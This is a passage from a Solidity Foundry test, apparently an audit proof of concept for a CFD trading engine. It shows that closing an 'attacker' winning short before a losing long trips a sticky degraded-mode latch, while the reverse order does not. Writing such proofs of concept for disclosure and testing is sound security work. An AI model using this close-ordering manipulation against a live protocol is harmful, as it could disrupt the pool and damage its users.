        console2.log("WINNER FIRST: E after both positions closed atoms", eA2);
        console2.log("WINNER FIRST: L after both positions closed atoms", lA2);
        console2.log("WINNER FIRST: sticky latch after recovery", engine.degradedMode());

        // Branch B: restore every contract to the same post-market-move snapshot.
        assertTrue(vm.revertToState(snapshot), "snapshot restore failed");
        (uint256 restoredE, uint256 restoredL) = _coverage();
        assertEq(restoredE, startingE, "snapshot E changed");
        assertEq(restoredL, startingL, "snapshot L changed");
        assertFalse(engine.degradedMode(), "snapshot retained first-branch latch");
        assertEq(_size(ATTACKER_LONG), TARGET, "LONG not restored");
        assertEq(_size(ATTACKER_SHORT), TARGET, "SHORT not restored");

        uint256 cashBeforeB = pool.totalAssets();
        int256 longPnlB = _closeAndReadRealizedPnl(ATTACKER_LONG, CfdTypes.Side.LONG);
        (uint256 eB1, uint256 lB1) = _coverage();
        assertLt(longPnlB, 0, "LONG must realize loss in control");
        assertGt(pool.totalAssets(), cashBeforeB, "loser close did not increase pool cash");
        assertGe(eB1, lB1, "loss-first unexpectedly breached reserve coverage");
        assertFalse(engine.degradedMode(), "loss-first unexpectedly latched on first close");
        console2.log("LOSER FIRST: E after losing LONG close atoms", eB1);
        console2.log("LOSER FIRST: L after losing LONG close atoms", lB1);
        console2.logInt(longPnlB);
        console2.log("LOSER FIRST: prior line is realized LONG price PnL (-) atoms");

        int256 shortPnlB = _closeAndReadRealizedPnl(ATTACKER_SHORT, CfdTypes.Side.SHORT);
        (uint256 eB2, uint256 lB2) = _coverage();
        assertGt(shortPnlB, 0, "SHORT must realize gain in control");
        assertGe(eB2, lB2, "loss-first ended with reserve deficit");
        assertFalse(engine.degradedMode(), "loss-first also latched");
        assertEq(_size(ATTACKER_LONG), 0, "loss-first LONG not fully closed");
        assertEq(_size(ATTACKER_SHORT), 0, "loss-first SHORT not fully closed");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "control has outstanding claims");
        console2.log("LOSER FIRST: E after both positions closed atoms", eB2);
        console2.log("LOSER FIRST: L after both positions closed atoms", lB2);
        console2.log("LOSER FIRST: degraded flag", engine.degradedMode());
        console2.log("CAUSAL RESULT: same initial positions, market price and risk parameters");
        console2.log("CAUSAL RESULT: SHORT winner first => sticky degraded latch");
        console2.log("CAUSAL RESULT: LONG loser first => no degraded latch");
    }
}

```

